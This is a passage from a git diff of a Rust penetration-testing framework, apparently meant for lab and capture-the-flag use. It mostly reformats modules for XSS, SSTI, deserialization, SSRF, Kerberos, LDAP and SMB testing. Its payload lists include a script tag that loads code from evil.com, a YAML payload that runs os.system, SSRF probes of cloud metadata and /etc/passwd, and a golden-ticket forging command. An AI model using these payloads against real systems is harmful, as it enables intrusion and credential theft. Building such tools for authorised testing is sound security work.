@@ -1,13 +1,13 @@
 //! Additional vulnerability modules — XSS, SSTI, Deserialization, SSRF exploit, Kerberos/AD
 
-use std::pin::Pin;
 use std::future::Future;
+use std::pin::Pin;
 use std::sync::LazyLock;
 use std::time::Duration;
 
 use rcf_core::{
-    Context, Module, ModuleCategory, ModuleInfo, ModuleOptions,
-    OptionValue, ModuleOutput, Result, Target,
+    Context, Module, ModuleCategory, ModuleInfo, ModuleOptions, ModuleOutput, OptionValue, Result,
+    Target,
 };
 
 fn build_client(timeout_secs: u64) -> reqwest::Client {
@@ -21,7 +21,8 @@ fn build_client(timeout_secs: u64) -> reqwest::Client {
 
 // ─── 1. XSS Scanner (Real HTTP Requests) ─────────────────────────────────────
 
-static XSS_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static XSS_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "auxiliary/scanner/http/xss".to_string(),
     display_name: "XSS Scanner".to_string(),
     description: "Detects Cross-Site Scripting vulnerabilities by injecting payloads and checking for reflection. Tests reflected, stored, and DOM-based XSS patterns. Works on PortSwigger XSS labs, THM web rooms, HTB web boxes.".to_string(),
@@ -34,34 +35,70 @@ static XSS_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
         "https://cwe.mitre.org/data/definitions/79.html".to_string(),
         "https://portswigger.net/web-security/cross-site-scripting".to_string(),
     ],
+}
 });
 
 pub struct XssScanner;
 
+impl Default for XssScanner {
+    fn default() -> Self {
+        Self
+    }
+}
+
 impl XssScanner {
-    pub fn new() -> Self { Self }
+    pub fn new() -> Self {
+        Self
+    }
 }
 
 impl Module for XssScanner {
-    fn info(&self) -> &ModuleInfo { &XSS_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &XSS_INFO
+    }
 
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
         opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "HTTP port", OptionValue::Integer(80)));
-        opts.add(rcf_core::ModuleOption::new("TARGET_URI", true, "Vulnerable URI"));
-        opts.add(rcf_core::ModuleOption::new("PARAM", true, "Parameter to test"));
-        opts.add(rcf_core::ModuleOption::with_default("METHOD", false, "HTTP method: GET/POST", OptionValue::String("GET".to_string())));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "HTTP port",
+            OptionValue::Integer(80),
+        ));
+        opts.add(rcf_core::ModuleOption::new(
+            "TARGET_URI",
+            true,
+            "Vulnerable URI",
+        ));
+        opts.add(rcf_core::ModuleOption::new(
+            "PARAM",
+            true,
+            "Parameter to test",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "METHOD",
+            false,
+            "HTTP method: GET/POST",
+            OptionValue::String("GET".to_string()),
+        ));
         opts
     }
 
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get_rport();
         let uri = ctx.get("TARGET_URI").cloned().unwrap_or_default();
         let param = ctx.get("PARAM").cloned().unwrap_or_default();
-        let method = ctx.get("METHOD").cloned().unwrap_or_else(|| "GET".to_string());
+        let _method = ctx
+            .get("METHOD")
+            .cloned()
+            .unwrap_or_else(|| "GET".to_string());
         let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);
 
         Box::pin(async move {
@@ -73,10 +110,16 @@ impl Module for XssScanner {
                 ("reflected_basic", "<script>alert('RCF_XSS_TEST')</script>"),
                 ("img_onerror", "<img src=x onerror=alert('RCF_XSS_TEST')>"),
                 ("svg_onload", "<svg onload=alert('RCF_XSS_TEST')>"),
-                ("event_handler", "\" onmouseover=\"alert('RCF_XSS_TEST')\" x=\""),
+                (
+                    "event_handler",
+                    "\" onmouseover=\"alert('RCF_XSS_TEST')\" x=\"",
+                ),
                 ("script_src", "<script src=//evil.com/xss.js></script>"),
                 ("encoded", "%3Cscript%3Ealert('RCF_XSS_TEST')%3C/script%3E"),
-                ("double_encoded", "%%33%3Cscript%3Ealert('RCF_XSS_TEST')%%33%3E/script%3E"),
+                (
+                    "double_encoded",
+                    "%%33%3Cscript%3Ealert('RCF_XSS_TEST')%%33%3E/script%3E",
+                ),
                 ("dom_based", "javascript:alert('RCF_XSS_TEST')"),
             ];
 
@@ -85,7 +128,11 @@ impl Module for XssScanner {
             for (name, payload) in &payloads {
                 let url = format!(
                     "{}://{}:{}{}?{}={}",
-                    scheme, rhost, rport, uri, param,
+                    scheme,
+                    rhost,
+                    rport,
+                    uri,
+                    param,
                     urlencoding::encode(payload)
                 );
 
@@ -100,12 +147,18 @@ impl Module for XssScanner {
                 if body.contains("RCF_XSS_TEST") {
                     // Check if it's in a script context (more dangerous)
                     let in_script = body.contains("<script>") && body.contains("RCF_XSS_TEST");
-                    let in_attr = body.contains("onerror=") || body.contains("onload=") || body.contains("onmouseover=");
+                    let in_attr = body.contains("onerror=")
+                        || body.contains("onload=")
+                        || body.contains("onmouseover=");
 
                     findings.push(format!(
                         "  [!] {}: XSS payload reflected{}{}",
                         name,
-                        if in_script { " (in script context)" } else { "" },
+                        if in_script {
+                            " (in script context)"
+                        } else {
+                            ""
+                        },
                         if in_attr { " (event handler)" } else { "" },
                     ));
                 }
@@ -135,23 +188,28 @@ impl Module for XssScanner {
                      Parameter: {}\n\n\
                      Findings:\n{}\n\n\
                      [*] XSS reflection detected — confirm exploitation manually",
-                    scheme, rhost, rport, uri, param,
+                    scheme,
+                    rhost,
+                    rport,
+                    uri,
+                    param,
                     findings.join("\n")
                 )
             };
 
-            if !findings.is_empty() {
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
-            } else {
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
-            }
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 2. SSTI / Template Injection ────────────────────────────────────────────
 
-static SSTI_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static SSTI_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "exploit/multi/http/ssti".to_string(),
     display_name: "Server-Side Template Injection".to_string(),
     description: "Detects and exploits SSTI in template engines: Jinja2 (Python), Twig (PHP), ERB (Ruby), Freemarker (Java), Velocity. Sends math expressions and checks for evaluation. Works on PortSwigger SSTI labs, HTB web boxes.".to_string(),
@@ -164,27 +222,55 @@ static SSTI_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
         "https://portswigger.net/web-security/server-side-template-injection".to_string(),
         "https://cwe.mitre.org/data/definitions/1336.html".to_string(),
     ],
+}
 });
 
 pub struct SSTI;
 
+impl Default for SSTI {
+    fn default() -> Self {
+        Self
+    }
+}
+
 impl SSTI {
-    pub fn new() -> Self { Self }
+    pub fn new() -> Self {
+        Self
+    }
 }
 
 impl Module for SSTI {
-    fn info(&self) -> &ModuleInfo { &SSTI_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &SSTI_INFO
+    }
 
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
         opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "HTTP port", OptionValue::Integer(80)));
-        opts.add(rcf_core::ModuleOption::new("TARGET_URI", true, "Vulnerable URI"));
-        opts.add(rcf_core::ModuleOption::new("PARAM", true, "Parameter to test"));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "HTTP port",
+            OptionValue::Integer(80),
+        ));
+        opts.add(rcf_core::ModuleOption::new(
+            "TARGET_URI",
+            true,
+            "Vulnerable URI",
+        ));
+        opts.add(rcf_core::ModuleOption::new(
+            "PARAM",
+            true,
+            "Parameter to test",
+        ));
         opts
     }
 
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get_rport();
@@ -213,7 +299,11 @@ impl Module for SSTI {
             for (engine, payload, expected) in &payloads {
                 let url = format!(
                     "{}://{}:{}{}?{}={}",
-                    scheme, rhost, rport, uri, param,
+                    scheme,
+                    rhost,
+                    rport,
+                    uri,
+                    param,
                     urlencoding::encode(payload)
                 );
 
@@ -233,7 +323,12 @@ impl Module for SSTI {
                 }
 
                 // Check for error messages indicating template engine
-                let error_indicators = ["TemplateSyntaxError", "UndefinedError", "TemplateError", "TemplateNotFound"];
+                let error_indicators = [
+                    "TemplateSyntaxError",
+                    "UndefinedError",
+                    "TemplateError",
+                    "TemplateNotFound",
+                ];
                 for indicator in &error_indicators {
                     if body.contains(indicator) {
                         findings.push(format!(
@@ -260,23 +355,28 @@ impl Module for SSTI {
                      Parameter: {}\n\n\
                      Findings:\n{}\n\n\
                      [*] Template injection detected — craft RCE payload for detected engine",
-                    scheme, rhost, rport, uri, param,
+                    scheme,
+                    rhost,
+                    rport,
+                    uri,
+                    param,
                     findings.join("\n")
                 )
             };
 
-            if !findings.is_empty() {
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
-            } else {
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
-            }
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 3. Deserialization Scanner ──────────────────────────────────────────────
 
-static DESERIAL_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static DESERIAL_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "auxiliary/scanner/http/deserialization".to_string(),
     display_name: "Insecure Deserialization Scanner".to_string(),
     description: "Detects insecure deserialization in Java (readObject), PHP (unserialize), Python (pickle/yaml), .NET (BinaryFormatter). Sends crafted payloads and checks for class loading errors or unexpected behavior.".to_string(),
@@ -289,27 +389,49 @@ static DESERIAL_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
         "https://cwe.mitre.org/data/definitions/502.html".to_string(),
         "https://portswigger.net/web-security/deserialization".to_string(),
     ],
+}
 });
 
 pub struct Deserialization;
 
-impl Deserialization {
-    pub fn new() -> Self { Self }
+impl Default for Deserialization {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for Deserialization {
-    fn info(&self) -> &ModuleInfo { &DESERIAL_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &DESERIAL_INFO
+    }
 
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
         opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "HTTP port", OptionValue::Integer(80)));
-        opts.add(rcf_core::ModuleOption::new("TARGET_URI", true, "Vulnerable URI"));
-        opts.add(rcf_core::ModuleOption::new("PARAM", true, "Parameter to test (e.g., token, session, data)"));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "HTTP port",
+            OptionValue::Integer(80),
+        ));
+        opts.add(rcf_core::ModuleOption::new(
+            "TARGET_URI",
+            true,
+            "Vulnerable URI",
+        ));
+        opts.add(rcf_core::ModuleOption::new(
+            "PARAM",
+            true,
+            "Parameter to test (e.g., token, session, data)",
+        ));
         opts
     }
 
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get_rport();
@@ -324,10 +446,19 @@ impl Module for Deserialization {
             // Deserialization test payloads
             let payloads = vec![
                 ("java_serial", "rO0ABXQADUhlbGxvIFdvcmxkIQ=="),
-                ("php_serialized", "O:4:\"User\":2:{s:4:\"name\";s:3:\"RCF\";s:3:\"age\";i:1;}"),
-                ("python_pickle", "gAN9cQAoWAQAAAB0ZXN0cQFYAwAAAFJDRnECXQADAAADAAADAAAFgANxBi4="),
+                (
+                    "php_serialized",
+                    "O:4:\"User\":2:{s:4:\"name\";s:3:\"RCF\";s:3:\"age\";i:1;}",
+                ),
+                (
+                    "python_pickle",
+                    "gAN9cQAoWAQAAAB0ZXN0cQFYAwAAAFJDRnECXQADAAADAAADAAAFgANxBi4=",
+                ),
                 ("python_yaml", "!!python/object/apply:os.system ['id']"),
-                ("dotnet_viewstate", "/wEyDw8PFgJmZA8WAgIDDxYCHgRUZXh0BQJSQ0Y="),
+                (
+                    "dotnet_viewstate",
+                    "/wEyDw8PFgJmZA8WAgIDDxYCHgRUZXh0BQJSQ0Y=",
+                ),
                 ("ruby_yaml", "--- !ruby/object:Gem::Installer\n  i: x"),
             ];
 
@@ -338,7 +469,11 @@ impl Module for Deserialization {
             let base_resp = match client.get(&base_url).send().await {
                 Ok(r) => r,
                 Err(e) => {
-                    return Ok(ModuleOutput::failure(&info_name, &format!("{}:{}", rhost, rport), &format!("Failed to connect: {}", e)));
+                    return Ok(ModuleOutput::failure(
+                        &info_name,
+                        &format!("{}:{}", rhost, rport),
+                        &format!("Failed to connect: {}", e),
+                    ));
                 }
             };
             let base_text = base_resp.text().await.unwrap_or_default();
@@ -346,7 +481,11 @@ impl Module for Deserialization {
             for (name, payload) in &payloads {
                 let url = format!(
                     "{}://{}:{}{}?{}={}",
-                    scheme, rhost, rport, uri, param,
+                    scheme,
+                    rhost,
+                    rport,
+                    uri,
+                    param,
                     urlencoding::encode(payload)
                 );
 
@@ -359,11 +498,16 @@ impl Module for Deserialization {
 
                 // Check for deserialization errors
                 let error_indicators = vec![
-                    "InvalidClassException", "StreamCorruptedException",
-                    "ClassNotFoundException", "unserialize()",
-                    "pickle.UnpicklingError", "YAMLError",
-                    "SerializationException", "ObjectStateFormatter",
-                    "unexpected object tag", "bad marshal data",
+                    "InvalidClassException",
+                    "StreamCorruptedException",
+                    "ClassNotFoundException",
+                    "unserialize()",
+                    "pickle.UnpicklingError",
+                    "YAMLError",
+                    "SerializationException",
+                    "ObjectStateFormatter",
+                    "unexpected object tag",
+                    "bad marshal data",
                 ];
 
                 for indicator in &error_indicators {
@@ -379,7 +523,9 @@ impl Module for Deserialization {
                 if body.len() > base_text.len() + 100 {
                     findings.push(format!(
                         "  [?] {}: Significant response change ({} vs {} bytes)",
-                        name, body.len(), base_text.len()
+                        name,
+                        body.len(),
+                        base_text.len()
                     ));
                 }
             }
@@ -400,23 +546,28 @@ impl Module for Deserialization {
                      Parameter: {}\n\n\
                      Findings:\n{}\n\n\
                      [*] Deserialization indicators found — confirm exploitation manually",
-                    scheme, rhost, rport, uri, param,
+                    scheme,
+                    rhost,
+                    rport,
+                    uri,
+                    param,
                     findings.join("\n")
                 )
             };
 
-            if !findings.is_empty() {
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
-            } else {
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
-            }
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 4. SSRF Exploitation (Real Requests) ────────────────────────────────────
 
-static SSRF_EXPLOIT_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static SSRF_EXPLOIT_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "exploit/multi/http/ssrf_exploit".to_string(),
     display_name: "SSRF Exploitation".to_string(),
     description: "Exploits Server-Side Request Forgery to access internal services. Tests localhost, cloud metadata (169.254.169.254), internal ports, and protocol abuse (gopher://, dict://). Essential for PortSwigger SSRF labs and HTB bug-bounty boxes.".to_string(),
@@ -429,32 +580,58 @@ static SSRF_EXPLOIT_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
         "https://cwe.mitre.org/data/definitions/918.html".to_string(),
         "https://portswigger.net/web-security/ssrf".to_string(),
     ],
+}
 });
 
 pub struct SsrfExploit;
 
-impl SsrfExploit {
-    pub fn new() -> Self { Self }
+impl Default for SsrfExploit {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for SsrfExploit {
-    fn info(&self) -> &ModuleInfo { &SSRF_EXPLOIT_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &SSRF_EXPLOIT_INFO
+    }
 
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
         opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target host"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "HTTP port", OptionValue::Integer(80)));
-        opts.add(rcf_core::ModuleOption::new("TARGET_URI", true, "Vulnerable URI"));
-        opts.add(rcf_core::ModuleOption::with_default("PARAM", false, "Parameter name", OptionValue::String("url".to_string())));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "HTTP port",
+            OptionValue::Integer(80),
+        ));
+        opts.add(rcf_core::ModuleOption::new(
+            "TARGET_URI",
+            true,
+            "Vulnerable URI",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "PARAM",
+            false,
+            "Parameter name",
+            OptionValue::String("url".to_string()),
+        ));
         opts
     }
 
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get_rport();
         let uri = ctx.get("TARGET_URI").cloned().unwrap_or_default();
-        let param = ctx.get("PARAM").cloned().unwrap_or_else(|| "url".to_string());
+        let param = ctx
+            .get("PARAM")
+            .cloned()
+            .unwrap_or_else(|| "url".to_string());
         let ssl = ctx.get("SSL").map(|s| s == "true").unwrap_or(false);
 
         Box::pin(async move {
@@ -471,7 +648,10 @@ impl Module for SsrfExploit {
                 ("localhost_5432_postgres", "http://127.0.0.1:5432"),
                 ("aws_metadata", "http://169.254.169.254/latest/meta-data/"),
                 ("aws_metadata_v2", "http://169.254.169.254/latest/api/token"),
-                ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/"),
+                (
+                    "gcp_metadata",
+                    "http://metadata.google.internal/computeMetadata/v1/",
+                ),
                 ("localhost_etc_passwd", "file:///etc/passwd"),
                 ("gopher_redis", "gopher://127.0.0.1:6379/_INFO"),
             ];
@@ -481,7 +661,11 @@ impl Module for SsrfExploit {
             for (name, target_url) in &targets {
                 let url = format!(
                     "{}://{}:{}{}?{}={}",
-                    scheme, rhost, rport, uri, param,
+                    scheme,
+                    rhost,
+                    rport,
+                    uri,
+                    param,
                     urlencoding::encode(target_url)
                 );
 
@@ -495,9 +679,18 @@ impl Module for SsrfExploit {
 
                 // Check for successful internal access
                 let success_indicators = vec![
-                    "root:", "ami-id", "instance-id", "local-ipv4",
-                    "INFO", "redis_version", "memcached", "MariaDB",
-                    "MySQL", "PostgreSQL", "PONG", "OK",
+                    "root:",
+                    "ami-id",
+                    "instance-id",
+                    "local-ipv4",
+                    "INFO",
+                    "redis_version",
+                    "memcached",
+                    "MariaDB",
+                    "MySQL",
+                    "PostgreSQL",
+                    "PONG",
+                    "OK",
                 ];
 
                 for indicator in &success_indicators {
@@ -534,23 +727,28 @@ impl Module for SsrfExploit {
                      Parameter: {}\n\n\
                      Findings:\n{}\n\n\
                      [*] Internal service access detected — target is vulnerable to SSRF",
-                    scheme, rhost, rport, uri, param,
+                    scheme,
+                    rhost,
+                    rport,
+                    uri,
+                    param,
                     findings.join("\n")
                 )
             };
 
-            if !findings.is_empty() {
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
-            } else {
-                Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
-            }
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 5. Kerberos Enumeration/Attacks ─────────────────────────────────────────
 
-static KERB_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static KERB_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "auxiliary/scanner/kerberos/kerb_enum".to_string(),
     display_name: "Kerberos Enumeration".to_string(),
     description: "Enumerates Kerberos services and users. Tests for AS-REP Roasting vulnerability (users without pre-authentication) and Kerberoasting (service accounts with SPNs). Essential for AD-focused HTB boxes and OffSec labs.".to_string(),
@@ -563,27 +761,55 @@ static KERB_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
         "https://attack.mitre.org/techniques/T1558/003/".to_string(),
         "https://attack.mitre.org/techniques/T1558/004/".to_string(),
     ],
+}
 });
 
 pub struct KerbEnum;
 
-impl KerbEnum {
-    pub fn new() -> Self { Self }
+impl Default for KerbEnum {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for KerbEnum {
-    fn info(&self) -> &ModuleInfo { &KERB_ENUM_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &KERB_ENUM_INFO
+    }
 
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
-        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target domain controller"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "Kerberos port", OptionValue::Integer(88)));
-        opts.add(rcf_core::ModuleOption::with_default("DOMAIN", false, "Domain name", OptionValue::String("".to_string())));
-        opts.add(rcf_core::ModuleOption::with_default("USER_FILE", false, "User list file", OptionValue::String("".to_string())));
+        opts.add(rcf_core::ModuleOption::new(
+            "RHOSTS",
+            true,
+            "Target domain controller",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "Kerberos port",
+            OptionValue::Integer(88),
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "DOMAIN",
+            false,
+            "Domain name",
+            OptionValue::String("".to_string()),
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "USER_FILE",
+            false,
+            "User list file",
+            OptionValue::String("".to_string()),
+        ));
         opts
     }
 
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get_rport();
@@ -600,18 +826,22 @@ impl Module for KerbEnum {
                  3. User Enumeration:\n   - KRB5ASREP errors reveal valid users\n   - Try common usernames: administrator, svc_*, sql_*, backup*\n\n\
                  4. Golden/Silver Ticket:\n   - After obtaining krbtgt hash, forge TGT\n   - Command: ticketer.py -nthash <hash> -domain-sid <SID> -domain {} administrator\n\n\
                  [*] Run Impacket scripts for actual exploitation\n[*] RCF provides the reconnaissance framework",
-                rhost, rport, domain,
-                domain, domain, rhost, domain
+                rhost, rport, domain, domain, domain, rhost, domain
             );
 
-            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 6. LDAP Enumeration ─────────────────────────────────────────────────────
 
-static LDAP_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static LDAP_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "auxiliary/scanner/ldap/ldap_search".to_string(),
     display_name: "LDAP Enumeration".to_string(),
     description: "Enumerates LDAP directory for users, groups, computers, and password policies. Essential for Active Directory reconnaissance on HTB/OffSec labs.".to_string(),
@@ -623,28 +853,61 @@ static LDAP_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
     references: vec![
         "https://attack.mitre.org/techniques/T1595/".to_string(),
     ],
+}
 });
 
 pub struct LdapSearch;
 
-impl LdapSearch {
-    pub fn new() -> Self { Self }
+impl Default for LdapSearch {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for LdapSearch {
-    fn info(&self) -> &ModuleInfo { &LDAP_ENUM_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &LDAP_ENUM_INFO
+    }
 
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
-        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target domain controller"));
-        opts.add(rcf_core::ModuleOption::with_default("RPORT", false, "LDAP port", OptionValue::Integer(389)));
-        opts.add(rcf_core::ModuleOption::with_default("DOMAIN", false, "Domain name", OptionValue::String("".to_string())));
-        opts.add(rcf_core::ModuleOption::with_default("USERNAME", false, "Bind username", OptionValue::String("".to_string())));
-        opts.add(rcf_core::ModuleOption::with_default("PASSWORD", false, "Bind password", OptionValue::String("".to_string())));
+        opts.add(rcf_core::ModuleOption::new(
+            "RHOSTS",
+            true,
+            "Target domain controller",
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "RPORT",
+            false,
+            "LDAP port",
+            OptionValue::Integer(389),
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "DOMAIN",
+            false,
+            "Domain name",
+            OptionValue::String("".to_string()),
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "USERNAME",
+            false,
+            "Bind username",
+            OptionValue::String("".to_string()),
+        ));
+        opts.add(rcf_core::ModuleOption::with_default(
+            "PASSWORD",
+            false,
+            "Bind password",
+            OptionValue::String("".to_string()),
+        ));
         opts
     }
 
-    fn run(&self, ctx: &mut Context, _target: &Target) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
+    fn run(
+        &self,
+        ctx: &mut Context,
+        _target: &Target,
+    ) -> Pin<Box<dyn Future<Output = Result<ModuleOutput>> + Send + '_>> {
         let info_name = self.info().name.clone();
         let rhost = ctx.get("RHOSTS").cloned().unwrap_or_default();
         let rport = ctx.get_rport();
@@ -655,7 +918,11 @@ impl Module for LdapSearch {
             let base_dn = if domain.is_empty() {
                 "DC=domain,DC=local".to_string()
             } else {
-                domain.split('.').map(|p| format!("DC={}", p)).collect::<Vec<_>>().join(",")
+                domain
+                    .split('.')
+                    .map(|p| format!("DC={}", p))
+                    .collect::<Vec<_>>()
+                    .join(",")
             };
 
             let msg = format!(
@@ -670,22 +937,42 @@ impl Module for LdapSearch {
                  4. Groups:\n   ldapsearch -H ldap://{}:{} -b '{}' '(objectClass=group)'\n\n\
                  5. Domain Admins:\n   ldapsearch -H ldap://{}:{} -b '{}' '(cn=Domain Admins)'\n\n\
                  [*] Run ldapsearch commands above for actual enumeration\n[*] Use BloodHound for AD relationship mapping",
-                rhost, rport, domain, base_dn,
-                rhost, rport, username, "<password>", base_dn,
-                rhost, rport, base_dn,
-                rhost, rport, base_dn,
-                rhost, rport, base_dn,
-                rhost, rport, base_dn
+                rhost,
+                rport,
+                domain,
+                base_dn,
+                rhost,
+                rport,
+                username,
+                "<password>",
+                base_dn,
+                rhost,
+                rport,
+                base_dn,
+                rhost,
+                rport,
+                base_dn,
+                rhost,
+                rport,
+                base_dn,
+                rhost,
+                rport,
+                base_dn
             );
 
-            Ok(ModuleOutput::success(&info_name, &format!("{}:{}", rhost, rport), &msg))
+            Ok(ModuleOutput::success(
+                &info_name,
+                &format!("{}:{}", rhost, rport),
+                &msg,
+            ))
         })
     }
 }
 
 // ─── 7. SMB Enumeration ──────────────────────────────────────────────────────
 
-static SMB_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
+static SMB_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| {
+    ModuleInfo {
     name: "auxiliary/scanner/smb/smb_enum".to_string(),
     display_name: "SMB Enumeration".to_string(),
     description: "Enumerates SMB shares, users, and groups. Tests for null sessions, anonymous access, and information disclosure. Essential for initial AD reconnaissance on HTB/OffSec Windows boxes.".to_string(),
@@ -697,27 +984,55 @@ static SMB_ENUM_INFO: LazyLock<ModuleInfo> = LazyLock::new(|| ModuleInfo {
     references: vec![
         "https://attack.mitre.org/techniques/T1135/".to_string(),
     ],
+}
 });
 
 pub struct SmbEnum;
 
-impl SmbEnum {
-    pub fn new() -> Self { Self }
+impl Default for SmbEnum {
+    fn default() -> Self {
+        Self
+    }
 }
 
 impl Module for SmbEnum {
-    fn info(&self) -> &ModuleInfo { &SMB_ENUM_INFO }
+    fn info(&self) -> &ModuleInfo {
+        &SMB_ENUM_INFO
+    }
 
     fn options(&self) -> ModuleOptions {
         let mut opts = ModuleOptions::new();
-        opts.add(rcf_core::ModuleOption::new("RHOSTS", true, "Target SMB server"));
